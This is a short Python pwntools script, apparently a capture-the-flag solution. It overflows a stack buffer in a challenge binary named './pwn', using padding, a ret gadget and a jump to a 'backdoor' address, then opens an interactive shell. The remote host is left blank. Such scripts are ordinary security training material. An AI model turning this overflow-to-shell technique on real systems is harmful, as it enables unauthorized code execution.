from pwn import *
import sys
context(arch='amd64', os='linux')

file_name = './pwn'

elf = ELF(file_name)

gdb_   = 1 if ('gdb' in sys.argv)        else 0
switch = 1 if ('remote' in sys.argv)     else 0
debug  = 0 if ('deoff'  in sys.argv)     else 1

if switch:
    target = ''
    port   = 0
    p = remote(target, port)
else:
    p = process(file_name)

if debug:
    context(log_level='debug')

if gdb_ and switch == 0:
    gdb.attach(p)
    pause()

s    = lambda data                : p.send(data)
sa   = lambda delim, data         : p.sendafter(delim, data)
sl   = lambda data                : p.sendline(data)
sla  = lambda delim, data         : p.sendlineafter(delim, data)
r    = lambda numb=4096          : p.recv(numb)
ru   = lambda delim, drop=True   : p.recvuntil(delim, drop)
rl   = lambda                    : p.recvline()
lg   = lambda name, data         : log.success(name + ': ' + hex(data))
uu64 = lambda data                : u64(data.ljust(8, b'\x00'))

#################################################################################
ret = 0x40101a
backdoor = 0x401236
payload = flat([
    b'meow',
    b'\x00',
    b'A' * (0x28 - 0x5),
    ret,
    backdoor
])
sla(b'What can u say?',payload)
sla(b'So,what size is it?',b'256')
p.interactive()
